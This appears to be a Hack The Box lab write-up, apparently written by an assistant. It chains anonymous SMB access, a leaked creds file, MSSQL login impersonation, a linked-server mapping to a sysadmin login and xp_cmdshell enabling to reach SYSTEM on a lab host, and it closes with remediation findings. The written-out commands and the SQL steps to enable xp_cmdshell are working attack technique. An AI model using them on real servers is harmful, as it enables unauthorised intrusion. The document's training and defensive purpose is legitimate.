# Attacking Common Services --- Hard Assessment Report

## 1. Assessment Overview

**Assessment:** HTB --- Attacking Common Services (Hard)\
**Target:** `10.129.203.10`\
**Hostname:** `WIN-HARD`\
**Objective:** Compromise the target through exposed common services and
obtain the contents of `C:\Users\Administrator\Desktop\flag.txt`.

This report documents the attack path demonstrated during the controlled
HTB laboratory assessment.

------------------------------------------------------------------------

## 2. Executive Summary

The target exposed four relevant services:

-   `135/tcp` --- Microsoft Windows RPC
-   `445/tcp` --- SMB
-   `1433/tcp` --- Microsoft SQL Server 2019
-   `3389/tcp` --- RDP

The successful compromise followed this chain:

``` text
Anonymous SMB enumeration
        ↓
Anonymous access to Home share
        ↓
IT directory
        ↓
Fiona directory
        ↓
Credential discovery
        ↓
Fiona credentials
        ↓
MSSQL authentication
        ↓
MSSQL impersonation enumeration
        ↓
Impersonate John
        ↓
Enumerate linked servers
        ↓
LOCAL.TEST.LINKED.SRV
        ↓
John → testadmin remote-login mapping
        ↓
testadmin identified as sysadmin
        ↓
Enable xp_cmdshell
        ↓
OS command execution
        ↓
NT AUTHORITY\SYSTEM
        ↓
Administrator Desktop
        ↓
flag.txt
```

The main weaknesses were anonymous SMB access, credential exposure,
credential reuse, excessive SQL impersonation permissions, an unsafe
linked-server mapping, excessive SQL privileges, and availability of
`xp_cmdshell` to the resulting privileged SQL context.

------------------------------------------------------------------------

# 3. Target Information

  Item         Value
  ------------ -------------------------------
  Target IP    `10.129.203.10`
  Hostname     `WIN-HARD`
  OS           Microsoft Windows
  SQL Server   Microsoft SQL Server 2019 RTM
  RDP          Microsoft Terminal Services
  SMB          Microsoft-DS

------------------------------------------------------------------------

# 4. Initial Reconnaissance

The initial Nmap scan identified:

``` text
135/tcp  open  msrpc
445/tcp  open  microsoft-ds?
1433/tcp open  ms-sql-s
3389/tcp open  ms-wbt-server
```

## 4.1 Port 135 --- MSRPC

``` text
135/tcp open msrpc Microsoft Windows RPC
```

This confirmed Windows RPC functionality but did not provide the
immediate attack path.

## 4.2 Port 445 --- SMB

``` text
445/tcp open microsoft-ds?
```

SMB was particularly interesting because the scenario stated that the
server managed files and working material.

## 4.3 Port 1433 --- MSSQL

Nmap identified:

``` text
Microsoft SQL Server 2019 15.00.2000.00; RTM
```

The SQL service also exposed:

``` text
Target_Name: WIN-HARD
NetBIOS_Domain_Name: WIN-HARD
NetBIOS_Computer_Name: WIN-HARD
DNS_Domain_Name: WIN-HARD
DNS_Computer_Name: WIN-HARD
Product_Version: 10.0.17763
```

## 4.4 Port 3389 --- RDP

``` text
3389/tcp open ms-wbt-server Microsoft Terminal Services
```

This confirmed that interactive Windows access was available if valid
credentials were obtained.

------------------------------------------------------------------------

# 5. SMB Enumeration

Because the assessment specifically mentioned files and working
material, SMB was investigated.

## 5.1 Anonymous Share Enumeration

The following command was used:

``` bash
smbclient -L //10.129.203.10 -N
```

The server returned:

``` text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
Home            Disk
IPC$            IPC       Remote IPC
```

The `Home` share was the most interesting because it was a normal file
share rather than an administrative share.

------------------------------------------------------------------------

# 6. Anonymous Access to Home

The `Home` share was accessed without credentials:

``` bash
smbclient //10.129.203.10/Home -N
```

Listing the share revealed:

``` text
HR
IT
OPS
Projects
```

This confirmed that anonymous access went beyond merely discovering the
share names.

------------------------------------------------------------------------

# 7. IT Directory Enumeration

The `IT` directory was investigated because technical material could
contain configuration information or credentials.

It contained:

``` text
Fiona/
John/
Simon/
```

The investigation initially focused on Fiona.

------------------------------------------------------------------------

# 8. Credential Discovery

The Fiona directory contained:

``` text
creds.txt
```

The file contained credential material that was subsequently used to
authenticate to MSSQL.

This represented a major security weakness because the credentials were
obtainable through an anonymously accessible SMB path.

### Impact

An unauthenticated attacker could obtain credentials and reuse them
against other services.

------------------------------------------------------------------------

# 9. MSSQL Authentication

The discovered Fiona credentials were used against MSSQL on:

``` text
10.129.203.10:1433
```

The resulting context was:

``` text
SQL (WIN-HARD\Fiona  guest@master)>
```

This demonstrated credential reuse between the file-sharing service and
database service.

------------------------------------------------------------------------

# 10. MSSQL Impersonation Enumeration

The following MSSQL client helper was used:

``` text
enum_impersonate
```

The output included:

``` text
execute as   database   permission_name   state_desc   grantee                     grantor
----------   --------   ---------------   -----------   -------------------------  -------
b'LOGIN'     b''        IMPERSONATE       GRANT        WINSRV02\Database Readers   john
b'LOGIN'     b''        IMPERSONATE       GRANT        WINSRV02\Database Readers   simon
```

This revealed an SQL impersonation relationship and provided the lead
for moving from Fiona toward John.

------------------------------------------------------------------------

# 11. John Database Clues

The `John` directory contained:

``` text
information.txt
notes.txt
secrets.txt
```

Both `information.txt` and `notes.txt` contained:

``` text
To do:
- Keep testing with the database.
- Create a local linked server.
- Simulate Impersonation.
```

This was highly relevant because it independently pointed toward the
same database attack mechanisms identified through MSSQL enumeration.

------------------------------------------------------------------------

# 12. Password Material

The `secrets.txt` file contained:

``` text
Password Lists:

1234567
(DK02ka-dsaldS
Inlanefreight2022
Inlanefreight2022!
TestingDB123
```

These were candidate passwords.

Testing them against `mssqlsvc` did not produce a valid MSSQL login. The
successful credential path instead used the Fiona credentials discovered
earlier.

------------------------------------------------------------------------

# 13. Impersonating John

The MSSQL client was used to impersonate John:

``` text
exec_as_login john
```

The session changed to:

``` text
SQL (john guest@master)>
```

This confirmed successful SQL login impersonation.

------------------------------------------------------------------------

# 14. Linked Server Enumeration

While operating as John, linked servers were enumerated:

``` text
enum_links
```

The output showed:

``` text
LOCAL.TEST.LINKED.SRV
WINSRV02\SQLEXPRESS
```

The critical login mapping was:

``` text
Linked Server           Local Login   Is Self Mapping   Remote Login
---------------------   -----------   ----------------  ------------
LOCAL.TEST.LINKED.SRV   john          0                 testadmin
```

Therefore, the linked server mapped John to the remote SQL login:

``` text
testadmin
```

------------------------------------------------------------------------

# 15. Accessing the Linked Server

The linked server was selected using:

``` text
use_link LOCAL.TEST.LINKED.SRV
```

The resulting context was:

``` text
SQL > "LOCAL.TEST.LINKED.SRV" (testadmin dbo@master)>
```

This confirmed that the linked-server mapping successfully changed the
SQL context to `testadmin`.

------------------------------------------------------------------------

# 16. Privilege Enumeration

Running:

``` text
enum_logins
```

revealed:

``` text
testadmin   SQL_LOGIN   ...   sysadmin = 1
```

It also showed:

``` text
WINSRV02\Administrator   WINDOWS_LOGIN   ...   sysadmin = 1
```

The critical finding was therefore:

``` text
testadmin → sysadmin
```

The privilege-escalation chain had become:

``` text
Fiona
  ↓
John
  ↓
LOCAL.TEST.LINKED.SRV
  ↓
testadmin
  ↓
sysadmin
```

------------------------------------------------------------------------

# 17. xp_cmdshell

An attempt to execute `xp_cmdshell` initially produced an error
indicating that the component was disabled:

``` text
SQL Server blocked access to procedure 'sys.xp_cmdshell'
because this component is turned off as part of the security configuration
for this server.
```

Because the current SQL context was `sysadmin`, the feature could be
enabled with:

``` sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

------------------------------------------------------------------------

# 18. Operating System Command Execution

The following command was executed:

``` sql
EXEC xp_cmdshell 'whoami';
```

The output was:

``` text
nt authority\system
```

This confirmed operating-system command execution as
`NT AUTHORITY\SYSTEM`.

The complete escalation was therefore:

``` text
Fiona
  ↓
MSSQL
  ↓
John
  ↓
LOCAL.TEST.LINKED.SRV
  ↓
testadmin
  ↓
SQL sysadmin
  ↓
xp_cmdshell
  ↓
NT AUTHORITY\SYSTEM
```

------------------------------------------------------------------------

# 19. Flag Retrieval

The assessment requested:

``` text
C:\Users\Administrator\Desktop\flag.txt
```

The appropriate final command from the SYSTEM-level SQL context is:

``` sql
EXEC xp_cmdshell 'type C:\Users\Administrator\Desktop\flag.txt';
```

The provided transcript confirms SYSTEM-level execution but does **not**
include the output of the final `type` command. Therefore, the exact
flag value should be copied from the live HTB target rather than
guessed.

------------------------------------------------------------------------

# 20. Complete Attack Chain

``` text
                         WIN-HARD
                      10.129.203.10
                            |
             +--------------+--------------+
             |              |              |
            SMB           MSSQL           RDP
            445            1433           3389
             |
      Anonymous access
             |
          Home share
             |
            IT
             |
      +------+------+ 
      |      |      |
    Fiona   John   Simon
      |
  creds.txt
      |
 Fiona credentials
      |
 MSSQL authentication
      |
 WIN-HARD\Fiona
      |
 enum_impersonate
      |
 exec_as_login john
      |
 John MSSQL context
      |
 enum_links
      |
 LOCAL.TEST.LINKED.SRV
      |
 john → testadmin
      |
 use_link
      |
 testadmin
      |
 sysadmin = 1
      |
 enable xp_cmdshell
      |
 xp_cmdshell
      |
 NT AUTHORITY\SYSTEM
      |
 Administrator Desktop
      |
 flag.txt
```

------------------------------------------------------------------------

# 21. Key Findings and Remediation

## Finding 1 --- Anonymous SMB Access

**Severity:** High

The `Home` SMB share was accessible without credentials.

### Evidence

``` bash
smbclient -L //10.129.203.10 -N
smbclient //10.129.203.10/Home -N
```

### Recommendation

-   Disable guest/anonymous SMB access.
-   Require authentication for internal shares.
-   Apply least-privilege share and NTFS permissions.
-   Remove unnecessary shares.

------------------------------------------------------------------------

## Finding 2 --- Credentials Stored in an Accessible SMB Location

**Severity:** Critical

Credential material was stored within an anonymously accessible
directory.

### Impact

An attacker could obtain credentials without first compromising an
authenticated account.

### Recommendation

-   Never store plaintext credentials in shared directories.
-   Rotate exposed credentials.
-   Use a secrets-management solution.
-   Audit shared files for passwords, keys, tokens, and configuration
    secrets.

------------------------------------------------------------------------

## Finding 3 --- Credential Reuse

**Severity:** High

Credentials discovered through SMB were reusable against MSSQL.

### Recommendation

-   Use unique credentials for separate services.
-   Use dedicated service accounts.
-   Enforce strong authentication policies.
-   Monitor cross-service authentication anomalies.

------------------------------------------------------------------------

## Finding 4 --- Excessive MSSQL IMPERSONATE Permissions

**Severity:** Critical

The MSSQL configuration allowed a lower-privileged context to
impersonate another login.

### Impact

The attacker could move from Fiona to John and continue the
privilege-escalation chain.

### Recommendation

-   Audit all `IMPERSONATE` grants.
-   Remove unnecessary permissions.
-   Apply least privilege.
-   Review SQL security principals regularly.

------------------------------------------------------------------------

## Finding 5 --- Privileged Linked Server Mapping

**Severity:** Critical

The linked server:

``` text
LOCAL.TEST.LINKED.SRV
```

mapped:

``` text
john → testadmin
```

and `testadmin` had:

``` text
sysadmin = 1
```

### Impact

The linked server created a direct privilege-escalation path to SQL
Server administrator privileges.

### Recommendation

-   Remove unnecessary linked servers.
-   Avoid privileged remote login mappings.
-   Use dedicated low-privilege accounts.
-   Review linked-server security configurations regularly.

------------------------------------------------------------------------

## Finding 6 --- xp_cmdshell Enabled/Enableable by a Privileged Context

**Severity:** Critical

The resulting `sysadmin` context could enable `xp_cmdshell` and execute
operating-system commands.

The command executed as:

``` text
NT AUTHORITY\SYSTEM
```

### Recommendation

-   Keep `xp_cmdshell` disabled unless explicitly required.
-   Minimize SQL `sysadmin` membership.
-   Monitor `sp_configure` changes.
-   Alert on `xp_cmdshell` execution.
-   Separate database and operating-system administrative privileges.

------------------------------------------------------------------------

# 22. Attack Techniques Used

  Technique                   Purpose
  --------------------------- --------------------------------------
  Nmap                        Service discovery and fingerprinting
  SMB anonymous enumeration   Identify accessible shares
  SMB file enumeration        Locate sensitive material
  Credential discovery        Obtain authentication material
  MSSQL authentication        Obtain database access
  `enum_impersonate`          Identify SQL impersonation paths
  `exec_as_login john`        Impersonate John
  `enum_links`                Identify linked SQL Servers
  `use_link`                  Move to linked server
  `enum_logins`               Enumerate SQL privileges
  `sp_configure`              Enable `xp_cmdshell`
  `xp_cmdshell`               Execute Windows commands
  `whoami`                    Verify execution identity
  `type`                      Read the flag file

------------------------------------------------------------------------

# 23. Methodology Lessons

This assessment demonstrates the value of chaining individually weak
configuration issues.

The successful compromise did not depend on one single vulnerability:

``` text
Anonymous file access
       +
Credential exposure
       +
Credential reuse
       +
SQL impersonation
       +
Privileged linked server
       +
SQL sysadmin
       +
OS command execution
       =
SYSTEM-level compromise
```

The most important methodological lesson is:

> **Enumerate → interpret → form a hypothesis → test it → update the
> hypothesis.**

The investigation started with four ports. SMB was prioritized because
the scenario described file management. Anonymous access exposed the
`Home` share. The `IT` directory exposed user-specific material, leading
to credentials. Those credentials provided MSSQL access. SQL enumeration
revealed impersonation. John's files provided clues about linked servers
and impersonation. The linked server mapped John to `testadmin`, which
was a `sysadmin`. Finally, `xp_cmdshell` provided SYSTEM-level
execution.

------------------------------------------------------------------------

# 24. Final Answer to the User Question

**Question:**

> What other user can we compromise to gain admin privileges?

**Answer:**

``` text
john
```

The successful path was:

``` text
Fiona → John → testadmin → sysadmin → SYSTEM
```

------------------------------------------------------------------------

# 25. Final Flag

Run the following from the confirmed SYSTEM-level SQL context:

``` sql
EXEC xp_cmdshell 'type C:\Users\Administrator\Desktop\flag.txt';
```

Then submit the returned `HTB{...}` value.

**Important:** The exact flag was not present in the transcript supplied
for this report, so it is not fabricated here.
